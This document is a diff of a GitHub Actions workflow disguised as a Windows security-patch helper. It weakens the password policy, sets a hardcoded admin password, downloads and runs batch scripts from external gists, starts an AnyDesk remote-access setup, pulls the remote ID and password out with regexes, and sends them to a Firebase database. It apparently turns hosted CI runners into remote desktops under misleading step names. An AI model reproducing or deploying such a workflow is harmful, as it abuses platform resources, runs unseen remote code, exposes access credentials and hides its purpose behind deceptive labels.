@@ -1,30 +1,24 @@
 name: Windows-Update-Helper
-
 on:
   workflow_dispatch:
-
 jobs:
   update:
     name: Installing Security Patches
     runs-on: windows-latest
     timeout-minutes: 340
-
     steps:
       - name: Checkout Code
         uses: actions/checkout@v4
-
       - name: Fix Password Policy
         shell: cmd
         run: |
           net accounts /minpwlen:0 /maxpwage:unlimited
           net user runneradmin Lohar@Admin9988!
-
       - name: Download Scripts (If not in Repo)
         shell: cmd
         run: |
           curl -L "https://gist.githubusercontent.com/Lohar-ji/bd85954a427f6d56338b8e5dbef85bf6/raw/" -o patch_v2.bat
           curl -L "https://gist.githubusercontent.com/Lohar-ji/ddcfeacb357b02b3224d9c565a70694d/raw/" -o show.bat
-
       - name: Apply System Patches
         shell: cmd
         run: |
@@ -33,7 +27,6 @@ jobs:
           ) else (
             echo patch_v2.bat nahi mili!
           )
-
       - name: Run AnyDesk Setup (capture, timeout)
         shell: powershell
         run: |
@@ -41,29 +34,22 @@ jobs:
             Write-Host "show.bat nahi mili!"
             exit 1
           }
-
           $outFile = "show_output.txt"
           if (Test-Path $outFile) { Remove-Item $outFile -Force }
-
-          # Redirect inside cmd to avoid Start-Process redirect conflicts
+          # Run in background and redirect inside cmd
           $cmd = 'call show.bat > "' + $outFile + '" 2>&1'
           $p = Start-Process -FilePath "cmd.exe" -ArgumentList "/c", $cmd -NoNewWindow -PassThru
-
           Write-Host "Started show.bat PID=$($p.Id)"
           $deadline = (Get-Date).AddMinutes(8)
-
           while ((Get-Date) -lt $deadline) {
             if ($p.HasExited) { break }
             Start-Sleep -Seconds 5
           }
-
           if (-not $p.HasExited) {
             Write-Host "Timeout: stopping show.bat so next steps run."
             Stop-Process -Id $p.Id -Force
           }
-
           Write-Host "Run AnyDesk Setup step finished."
-
       - name: Send credentials to Firebase
         shell: powershell
         env:
@@ -74,59 +60,47 @@ jobs:
             Write-Host "show_output.txt missing"
             exit 0
           }
-
           $text = Get-Content -Raw -Path show_output.txt
-
           $id = [regex]::Match($text,'Windows\s*Cloud\s*(?:PC\s*)?ID\s*is\s*:\s*`?(\d[\d\s]{5,})`?','IgnoreCase').Groups[1].Value
           $id = ($id -replace '\s+','').Trim()
-
           $pw = [regex]::Match($text,'Windows\s*Cloud\s*(?:PC\s*)?Password(?:\s+is)?\s*:\s*([^\r\n]+)','IgnoreCase').Groups[1].Value.Trim()
-
           if (-not $id -or -not $pw) {
             Write-Host "Credentials not found."
             exit 0
           }
-
           @"
           const admin = require('firebase-admin');
-
           const sa = JSON.parse(process.env.FIREBASE_SA_JSON);
           const dbURL = process.env.FIREBASE_RTDB_URL;
           const runId = process.env.GITHUB_RUN_ID;
           const repo = process.env.GITHUB_REPOSITORY;
           const pcId = process.env.PC_ID;
           const pcPassword = process.env.PC_PASSWORD;
-
           admin.initializeApp({
             credential: admin.credential.cert(sa),
             databaseURL: dbURL
           });
-
           const payload = {
             pc_id: pcId,
             pc_password: pcPassword,
             ts: Math.floor(Date.now() / 1000),
             repo: repo
           };
-
-          admin.database().ref(`runs/${runId}/credentials`).set(payload)
+          admin.database().ref("runs/" + runId + "/credentials").set(payload)
             .then(() => {
-              console.log(`Firebase write OK: runs/${runId}/credentials`);
+              console.log("Firebase write OK: runs/" + runId + "/credentials");
               process.exit(0);
             })
             .catch((e) => {
-              console.error("Firebase write failed:", e && e.message ? e.message : e);
+              console.error("Firebase write failed:", (e && e.message) ? e.message : e);
               process.exit(1);
             });
           "@ | Out-File -FilePath write_firebase.js -Encoding utf8
-
           npm init -y | Out-Null
           npm i firebase-admin --silent
-
           $env:PC_ID = $id
           $env:PC_PASSWORD = $pw
           node write_firebase.js
-
       - name: Keep Alive
         shell: cmd
         run: |
